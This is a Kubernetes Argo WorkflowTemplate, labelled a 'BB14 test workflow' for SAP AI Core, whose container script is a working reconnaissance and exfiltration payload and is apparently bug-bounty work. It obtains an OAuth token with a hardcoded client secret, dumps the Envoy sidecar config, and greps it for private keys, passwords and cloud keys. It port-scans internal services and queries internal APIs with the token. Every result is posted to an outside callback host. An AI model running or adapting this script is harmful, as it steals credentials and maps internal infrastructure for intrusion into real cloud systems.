apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "7.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - sh
      - -c
      - |
        CB="https://www.masonhck.tech/cb.php"
        post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
        get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
        chunk() { split -b 600 - /tmp/chunk_ && for f in /tmp/chunk_*; do cat "$f" | post "$1-$(basename $f)"; rm "$f"; done ; }

        get "recon7-start-$(hostname)"

        # Get JWT
        TOKEN=$(curl -k -s -X POST "https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com/oauth/token" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          -d "grant_type=client_credentials" \
          -d "client_id=sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784" \
          -d "client_secret=aicore-bb-14-key\$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc=" \
          | grep -oE '"access_token":"[^"]+' | cut -d'"' -f4)
        echo "token_len=$(echo -n $TOKEN | wc -c)" | post "recon7-token"

        # === 1. ENVOY CONFIG DUMP ===
        curl -s "http://127.0.0.1:15000/config_dump" > /tmp/cdump.json
        wc -c /tmp/cdump.json | post "recon7-cdump-size"

        # TLS certificates and private keys
        grep -i "inline_bytes\|inline_string\|private_key\|certificate_chain\|trusted_ca\|tls_certificate" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-tls"

        # Secrets, tokens, passwords, AWS keys
        grep -i "secret\|password\|access_key\|aws_\|api_key\|credential" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-secrets"

        # Auth headers injected by Istio
        grep -i "authorization\|x-forwarded\|x-envoy\|x-request-id\|request_headers_to_add" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-headers"

        # Check for Loki, Helm, NFS, EFS references in config
        grep -i "loki\|helm\|tiller\|nfs\|efs\|grafana\|kibana\|elastic" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-refs"

        # Transport socket configs (mTLS cert details)
        grep -B2 -A10 "transport_socket" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-transport-1"
        grep -B2 -A10 "transport_socket" /tmp/cdump.json | sed -n '30,80p' | head -c 1800 | post "recon7-cdump-transport-2"

        # Secret discovery service (SDS) refs
        grep -i "sds\|secret_name\|ROOTCA\|default\|istiod" /tmp/cdump.json | head -c 1800 | post "recon7-cdump-sds"

        # === 2. LOKI PROBE (port 3100) ===
        # Search Envoy clusters for Loki
        curl -s "http://127.0.0.1:15000/clusters" | grep -i "loki" | head -c 700 | post "recon7-loki-envoy"

        # DNS brute force for Loki service
        for ns in logging loki monitoring default kube-system; do
          nslookup loki.${ns}.svc.cluster.local 100.104.0.10 2>&1 | grep -v "^$" | head -c 300 | post "recon7-loki-dns-${ns}"
        done
        nslookup loki-gateway.logging.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-loki-gw-dns"

        # Scan known service IPs for port 3100
        for ip in 100.104.0.1 100.104.7.43 100.110.1.63 100.104.178.234 100.109.200.238 100.110.10.25 100.98.92.225; do
          curl -s --connect-timeout 2 "http://${ip}:3100/config" 2>&1 | head -c 700 | post "recon7-loki-ip-${ip}"
        done

        # Try Loki on common cluster IP range (quick sweep)
        for i in 1 2 3 4 5 10 20 50 100 150 200; do
          curl -s --connect-timeout 1 "http://100.104.${i}.1:3100/ready" 2>&1 | head -c 200 | post "recon7-loki-scan-104-${i}"
        done

        # === 3. HELM/TILLER PROBE (port 44134) ===
        grep -i "tiller\|helm" /tmp/cdump.json | head -c 700 | post "recon7-helm-envoy"
        for ip in 100.104.0.1 100.104.7.43 127.0.0.1; do
          ncat -w 2 -z ${ip} 44134 2>&1 && echo "OPEN" | post "recon7-tiller-${ip}" || echo "CLOSED" | post "recon7-tiller-${ip}"
        done
        # DNS for tiller
        nslookup tiller-deploy.kube-system.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-tiller-dns"

        # === 4. NFS/EFS PROBE (port 2049) ===
        # Get pod IP and subnet
        ip addr show 2>&1 | head -c 500 | post "recon7-pod-network"

        # Check for NFS mounts already present
        mount 2>&1 | head -c 500 | post "recon7-mounts"
        df -h 2>&1 | head -c 500 | post "recon7-df"

        # Scan for NFS on known IPs
        for ip in 100.104.0.1 100.64.56.14 100.64.58.80 100.64.67.13; do
          ncat -w 2 -z ${ip} 2049 2>&1 && echo "OPEN" | post "recon7-nfs-${ip}" || echo "CLOSED" | post "recon7-nfs-${ip}"
        done

        # Check for EFS DNS (AWS pattern)
        nslookup fs-*.efs.eu-central-1.amazonaws.com 2>&1 | head -c 300 | post "recon7-efs-dns"
        # Scan common EFS IPs in VPC
        for i in 1 2 3 4 5; do
          ncat -w 1 -z 10.0.${i}.1 2049 2>&1 && echo "OPEN" | post "recon7-efs-10-0-${i}" || echo "CLOSED" | post "recon7-efs-10-0-${i}"
        done

        # === 5. KUBE-STATE-METRICS ===
        # Find KSM services from Envoy
        curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.opentelemetry\.svc\.cluster\.local' | sort -u | head -c 700 | post "recon7-otel-svcs"

        # Try KSM on port 8080 and 8443
        for svc in $(curl -s "http://127.0.0.1:15000/clusters" | grep -oE 'ksm-[a-z0-9-]+\.opentelemetry\.svc\.cluster\.local' | sort -u | head -3); do
          curl -s --connect-timeout 3 "http://${svc}:8080/metrics" 2>&1 | head -c 700 | post "recon7-ksm-8080-$(echo $svc | cut -d. -f1)"
          curl -s --connect-timeout 3 "http://${svc}:8443/metrics" 2>&1 | head -c 700 | post "recon7-ksm-8443-$(echo $svc | cut -d. -f1)"
        done

        # Try KSM via kube-state-metrics default
        nslookup kube-state-metrics.kube-system.svc.cluster.local 100.104.0.10 2>&1 | head -c 300 | post "recon7-ksm-dns"

        # === 6. USAGE API WITH JWT ===
        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-usage-bearer"
        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/api/v1/usage" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-usage-api"
        curl -s --connect-timeout 5 "http://usage-api-service.usage-api.svc.cluster.local/health" 2>&1 | head -c 700 | post "recon7-usage-health"

        # === 7. MLFLOW ADDITIONAL ENDPOINTS ===
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        curl -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/registered-models/list" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-mlflow-models"
        curl -s --connect-timeout 5 "${TRACK}/api/2.0/mlflow/artifacts/list" \
          -H "Authorization: Bearer ${TOKEN}" 2>&1 | head -c 700 | post "recon7-mlflow-artifacts"
        curl -s --connect-timeout 5 "${TRACK}/health" 2>&1 | head -c 700 | post "recon7-mlflow-health"
        curl -s --connect-timeout 5 "${TRACK}/version" 2>&1 | head -c 700 | post "recon7-mlflow-version"

        # === 8. BROAD PORT SCAN ===
        # Quick scan of key internal IPs for interesting ports
        for ip in 100.104.0.1 100.104.7.43; do
          for port in 3100 4317 4318 5601 8080 8200 8443 9090 9200 9300 15010 15014 44134; do
            ncat -w 1 -z ${ip} ${port} 2>&1 && echo "${ip}:${port} OPEN" | post "recon7-scan" || true
          done
        done

        # === 9. DYNATRACE ACTIVEGATE ===
        curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.dynatrace\.svc\.cluster\.local' | sort -u | head -c 500 | post "recon7-dyna-svcs"
        for svc in $(curl -s "http://127.0.0.1:15000/clusters" | grep -oE '[a-z0-9-]+\.dynatrace\.svc\.cluster\.local' | sort -u | head -3); do
          curl -s --connect-timeout 3 "http://${svc}:443/" 2>&1 | head -c 500 | post "recon7-dyna-$(echo $svc | cut -d. -f1)"
          curl -s --connect-timeout 3 "https://${svc}:443/rest/health" -k 2>&1 | head -c 500 | post "recon7-dyna-health-$(echo $svc | cut -d. -f1)"
        done

        get "recon7-done-$(hostname)"
      resources:
        limits:
          cpu: "1"
          memory: "1Gi"
        requests:
          cpu: "100m"
          memory: "256Mi"
